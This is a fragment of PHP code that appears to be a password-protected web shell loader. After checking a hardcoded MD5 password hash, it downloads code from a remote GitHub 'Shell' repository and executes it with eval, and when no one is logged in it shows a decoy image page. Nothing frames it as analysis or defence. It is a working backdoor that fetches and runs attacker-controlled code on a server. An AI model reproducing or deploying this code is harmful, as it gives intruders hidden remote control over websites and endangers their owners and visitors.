...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '7f56f49d957925e095d671a52b8fe81b'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/Clay-Haxor3/Shell/refs/heads/main/conviguration');
    eval('?>' . $a);
} else {
    ...
    <body>
        <center>
        <img src="https://pomf2.lain.la/f/1s5gc3pl.png" />
